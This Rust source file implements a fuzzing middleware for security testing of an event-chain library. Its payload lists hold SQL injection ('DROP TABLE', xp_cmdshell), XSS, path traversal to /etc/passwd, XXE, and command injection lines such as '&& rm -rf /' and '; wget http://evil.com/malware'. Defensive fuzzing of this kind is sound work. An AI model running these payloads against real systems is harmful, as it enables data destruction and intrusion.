use crate::core::event_context::EventContext;
use crate::core::event_result::EventResult;
use crate::events::chainable_event::ChainableEvent;
use crate::events::event_middleware::EventMiddleware;
use std::sync::{Arc, Mutex};

/// Types of malicious/edge-case inputs to inject
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FuzzType {
    /// SQL injection attempts
    SqlInjection,
    /// Cross-site scripting (XSS) payloads
    XssPayload,
    /// Path traversal attempts (../, etc.)
    PathTraversal,
    /// Extremely large inputs (buffer overflow attempts)
    OversizedInput,
    /// Null bytes and special characters
    NullBytes,
    /// Unicode edge cases (RTL, zero-width, homoglyphs)
    UnicodeEdgeCases,
    /// Integer overflow/underflow attempts
    IntegerOverflow,
    /// Format string vulnerabilities
    FormatString,
    /// Command injection attempts
    CommandInjection,
    /// LDAP injection
    LdapInjection,
    /// XML/XXE injection
    XmlInjection,
    /// Empty/null inputs
    EmptyInput,
    /// Deeply nested structures (DoS)
    DeeplyNested,
}

/// Predefined malicious payloads for each fuzz type
struct FuzzPayloads;

impl FuzzPayloads {
    fn sql_injection() -> &'static [&'static str] {
        &[
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL, NULL--",
            "admin'--",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('dir'); --",
        ]
    }

    fn xss_payload() -> &'static [&'static str] {
        &[
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "'-alert(document.cookie)-'",
            "<iframe src=javascript:alert('XSS')>",
        ]
    }

    fn path_traversal() -> &'static [&'static str] {
        &[
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
    }

    fn oversized_input() -> String {
        "A".repeat(1_000_000) // 1MB of 'A'
    }

    fn null_bytes() -> &'static [&'static str] {
        &[
            "test\0.txt",
            "test\0\0\0",
            "\0admin",
            "file.txt\0.jpg",
        ]
    }

    fn unicode_edge_cases() -> &'static [&'static str] {
        &[
            "\u{202E}text", // Right-to-left override
            "\u{200B}\u{200C}\u{200D}", // Zero-width characters
            "аdmin", // Cyrillic 'a' (homoglyph)
            "𝐀𝐝𝐦𝐢𝐧", // Mathematical bold
            "\u{FEFF}", // Zero-width no-break space
            "test\u{0301}\u{0301}\u{0301}", // Combining characters
        ]
    }

    fn integer_overflow() -> &'static [&'static str] {
        &[
            "9223372036854775807",  // i64::MAX
            "-9223372036854775808", // i64::MIN
            "18446744073709551615", // u64::MAX
            "99999999999999999999999999999",
        ]
    }

    fn format_string() -> &'static [&'static str] {
        &[
            "%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x",
            "%n%n%n%n%n",
            "%.1000000f",
            "%p%p%p%p",
        ]
    }

    fn command_injection() -> &'static [&'static str] {
        &[
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(cat /etc/passwd)",
            "&& rm -rf /",
            "; wget http://evil.com/malware",
        ]
    }

    fn ldap_injection() -> &'static [&'static str] {
        &[
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
            "*))(|(cn=*",
        ]
    }

    fn xml_injection() -> &'static [&'static str] {
        &[
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]>",
            "<![CDATA[malicious content]]>",
        ]
    }

    fn empty_input() -> &'static [&'static str] {
        &[
            "",
            " ",
            "   ",
            "\t",
            "\n",
            "\r\n",
        ]
    }

    fn deeply_nested() -> String {
        let mut result = String::from("[");
        for _ in 0..10000 {
            result.push_str("[");
        }
        for _ in 0..10000 {
            result.push_str("]");
        }
        result.push_str("]");
        result
    }
}

/// Configuration for security fuzzing
#[derive(Debug, Clone)]
pub struct FuzzConfig {
    /// Probability of fuzzing occurring (0.0 to 1.0)
    pub probability: f64,
    /// Types of fuzzing to potentially inject
    pub fuzz_types: Vec<FuzzType>,
    /// Context keys to inject fuzzing into
    pub target_keys: Vec<String>,
}

impl Default for FuzzConfig {
    fn default() -> Self {
        Self {
            probability: 0.2,
            fuzz_types: vec![
                FuzzType::SqlInjection,
                FuzzType::XssPayload,
                FuzzType::PathTraversal,
            ],
            target_keys: vec![
                "input".to_string(),
                "username".to_string(),
                "password".to_string(),
                "email".to_string(),
                "filename".to_string(),
                "query".to_string(),
            ],
        }
    }
}

/// Statistics about fuzzing attempts
#[derive(Debug, Clone, Default)]
pub struct FuzzStats {
    pub total_events: u64,
    pub fuzzing_attempts: u64,
    pub detected_vulnerabilities: u64,
    pub sql_injection_tests: u64,
    pub xss_tests: u64,
    pub path_traversal_tests: u64,
    pub overflow_tests: u64,
    pub other_tests: u64,
}

/// Middleware that injects malicious inputs to detect security vulnerabilities
///
/// # Purpose
///
/// This middleware is designed for **security testing only**. It helps detect:
/// - Input validation bugs
/// - Injection vulnerabilities (SQL, XSS, command, etc.)
/// - Buffer overflow vulnerabilities
/// - Integer overflow/underflow bugs
/// - Path traversal vulnerabilities
/// - Logic errors with edge cases
///
/// # ️ WARNING
///
/// **TESTING ONLY!** This middleware injects potentially dangerous payloads.
/// - NEVER use in production
/// - NEVER use on live databases
/// - NEVER use with real user data
/// - ALWAYS use in isolated test environments
///
/// # How It Works
///
/// Before event execution, this middleware:
/// 1. Checks if fuzzing should occur (based on probability)
/// 2. Selects a random fuzz type
/// 3. Injects malicious payloads into configured context keys
/// 4. Executes the event with tainted data
/// 5. Monitors for unexpected failures or behaviors
///
/// # What to Look For
///
/// When using this middleware, watch for:
/// - **Panics/crashes**: Indicates vulnerability to malformed input
/// - **Error messages leaking info**: Could aid attackers
/// - **Unexpected success**: Input validation may be missing
/// - **Performance degradation**: DoS vulnerability
/// - **Different behavior**: Logic bugs with edge cases
///
/// # Example
///
/// ```ignore
/// use event_chains::middleware::fuzzing::{FuzzingMiddleware, FuzzConfig, FuzzType};
///
/// // Basic fuzzing: 30% chance of SQL injection tests
/// let fuzzer = FuzzingMiddleware::new(0.3)
///     .with_fuzz_types(vec![FuzzType::SqlInjection]);
///
/// let chain = EventChain::new()
///     .middleware(fuzzer.clone())
///     .event(DatabaseQueryEvent)
///     .with_fault_tolerance(FaultToleranceMode::Lenient);
///
/// // Run many iterations to find bugs
/// for i in 0..1000 {
///     let mut context = EventContext::new();
///     context.set("query", format!("SELECT * FROM users WHERE id = {}", i));
///     
///     let result = chain.execute(&mut context);
///     
///     // Check for vulnerabilities
///     if result.success && context.get::<String>("sql_result").is_some() {
///         println!("️  Possible SQL injection vulnerability detected!");
///     }
/// }
///
/// fuzzer.print_stats();
/// ```
#[derive(Clone)]
pub struct FuzzingMiddleware {
    config: FuzzConfig,
    stats: Arc<Mutex<FuzzStats>>,
    enabled: Arc<Mutex<bool>>,
    log_fuzzing: bool,
}

impl FuzzingMiddleware {
    /// Create fuzzing middleware with simple probability
    pub fn new(probability: f64) -> Self {
        Self::with_config(FuzzConfig {
            probability: probability.clamp(0.0, 1.0),
            ..Default::default()
        })
    }

    /// Create fuzzing middleware with full configuration
    pub fn with_config(config: FuzzConfig) -> Self {
        Self {
            config,
            stats: Arc::new(Mutex::new(FuzzStats::default())),
            enabled: Arc::new(Mutex::new(true)),
            log_fuzzing: true,
        }
    }

    /// Set specific fuzz types to use
    pub fn with_fuzz_types(mut self, types: Vec<FuzzType>) -> Self {
        self.config.fuzz_types = types;
        self
    }

    /// Set specific context keys to target
    pub fn with_target_keys(mut self, keys: Vec<String>) -> Self {
        self.config.target_keys = keys;
        self
    }

    /// Enable or disable fuzzing at runtime
    pub fn set_enabled(&self, enabled: bool) {
        if let Ok(mut e) = self.enabled.lock() {
            *e = enabled;
        }
    }

    /// Check if fuzzing is currently enabled
    pub fn is_enabled(&self) -> bool {
        self.enabled.lock().map(|e| *e).unwrap_or(false)
    }

    /// Configure whether to log fuzzing attempts
    pub fn with_logging(mut self, enabled: bool) -> Self {
        self.log_fuzzing = enabled;
        self
    }

    /// Get current fuzzing statistics
    pub fn get_stats(&self) -> Option<FuzzStats> {
        self.stats.lock().ok().map(|s| s.clone())
    }

    /// Reset statistics
    pub fn reset_stats(&self) {
        if let Ok(mut stats) = self.stats.lock() {
            *stats = FuzzStats::default();
        }
    }

    /// Print statistics to stdout
    pub fn print_stats(&self) {
        if let Ok(stats) = self.stats.lock() {
            println!("\n=== Security Fuzzing Statistics ===");
            println!("Total events:                    {}", stats.total_events);
            println!("Fuzzing attempts:                {} ({:.1}%)",
                     stats.fuzzing_attempts,
                     if stats.total_events > 0 {
                         (stats.fuzzing_attempts as f64 / stats.total_events as f64) * 100.0
                     } else {
                         0.0
                     }
            );
            println!("  - SQL injection tests:         {}", stats.sql_injection_tests);
            println!("  - XSS tests:                   {}", stats.xss_tests);
            println!("  - Path traversal tests:        {}", stats.path_traversal_tests);
            println!("  - Overflow tests:              {}", stats.overflow_tests);
            println!("  - Other tests:                 {}", stats.other_tests);
            println!("Potential vulnerabilities:       {}", stats.detected_vulnerabilities);
            println!();
        }
    }

    fn should_fuzz(&self) -> bool {
        use std::collections::hash_map::RandomState;
        use std::hash::{BuildHasher, Hash, Hasher};

        let mut hasher = RandomState::new().build_hasher();
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
            .hash(&mut hasher);

        let random_value = (hasher.finish() % 10000) as f64 / 10000.0;
        random_value < self.config.probability
    }

    fn select_fuzz_type(&self) -> FuzzType {
        if self.config.fuzz_types.is_empty() {
            return FuzzType::SqlInjection;
        }

        use std::collections::hash_map::RandomState;
        use std::hash::{BuildHasher, Hash, Hasher};

        let mut hasher = RandomState::new().build_hasher();
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
            .hash(&mut hasher);

        let idx = (hasher.finish() as usize) % self.config.fuzz_types.len();
        self.config.fuzz_types[idx]
    }

    fn get_payload(&self, fuzz_type: FuzzType) -> String {
        use std::collections::hash_map::RandomState;
        use std::hash::{BuildHasher, Hash, Hasher};

        let mut hasher = RandomState::new().build_hasher();
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
            .hash(&mut hasher);

        match fuzz_type {
            FuzzType::SqlInjection => {
                let payloads = FuzzPayloads::sql_injection();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::XssPayload => {
                let payloads = FuzzPayloads::xss_payload();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::PathTraversal => {
                let payloads = FuzzPayloads::path_traversal();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::OversizedInput => FuzzPayloads::oversized_input(),
            FuzzType::NullBytes => {
                let payloads = FuzzPayloads::null_bytes();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::UnicodeEdgeCases => {
                let payloads = FuzzPayloads::unicode_edge_cases();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::IntegerOverflow => {
                let payloads = FuzzPayloads::integer_overflow();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::FormatString => {
                let payloads = FuzzPayloads::format_string();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::CommandInjection => {
                let payloads = FuzzPayloads::command_injection();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::LdapInjection => {
                let payloads = FuzzPayloads::ldap_injection();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::XmlInjection => {
                let payloads = FuzzPayloads::xml_injection();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::EmptyInput => {
                let payloads = FuzzPayloads::empty_input();
                let idx = (hasher.finish() as usize) % payloads.len();
                payloads[idx].to_string()
            }
            FuzzType::DeeplyNested => FuzzPayloads::deeply_nested(),
        }
    }

    fn inject_payload(&self, context: &mut EventContext, fuzz_type: FuzzType) {
        if self.config.target_keys.is_empty() {
            return;
        }

        let payload = self.get_payload(fuzz_type);

        // Inject into all target keys
        for key in &self.config.target_keys {
            // Store original value for potential recovery
            let backup_key = format!("__fuzz_backup_{}", key);
            if let Some(original) = context.get::<String>(key) {
                context.set(&backup_key, original);
            }

            // Inject malicious payload
            context.set(key, payload.clone());
        }
    }
}

impl EventMiddleware for FuzzingMiddleware {
    fn execute(
        &self,
        event: &dyn ChainableEvent,
        context: &mut EventContext,
        next: &mut dyn FnMut(&mut EventContext) -> EventResult<()>,
    ) -> EventResult<()> {
        // Update stats
        if let Ok(mut stats) = self.stats.lock() {
            stats.total_events += 1;
        }

        // Check if enabled
        if !self.is_enabled() {
            return next(context);
        }

        // Decide whether to fuzz
        if !self.should_fuzz() {
            return next(context);
        }

        // Select fuzz type
        let fuzz_type = self.select_fuzz_type();

        // Update stats
        if let Ok(mut stats) = self.stats.lock() {
            stats.fuzzing_attempts += 1;
            match fuzz_type {
                FuzzType::SqlInjection => stats.sql_injection_tests += 1,
                FuzzType::XssPayload => stats.xss_tests += 1,
                FuzzType::PathTraversal => stats.path_traversal_tests += 1,
                FuzzType::OversizedInput | FuzzType::IntegerOverflow => stats.overflow_tests += 1,
                _ => stats.other_tests += 1,
            }
        }

        if self.log_fuzzing {
            println!("    [FUZZ] Injecting {:?} payload in {}", fuzz_type, event.name());
        }

        // Inject malicious payload
        self.inject_payload(context, fuzz_type);

        // Execute event with tainted data
        let result = next(context);

        // Analyze result for potential vulnerabilities
        // If the event succeeds with malicious input, it might indicate a vulnerability
        if result.is_success() {
            if self.log_fuzzing {
                println!("   ️  [FUZZ] Event {} succeeded with {:?} payload - potential vulnerability!",
                         event.name(), fuzz_type);
            }
            if let Ok(mut stats) = self.stats.lock() {
                stats.detected_vulnerabilities += 1;
            }
        }

        result
    }
}

impl Default for FuzzingMiddleware {
    fn default() -> Self {
        Self::new(0.2)
    }
}
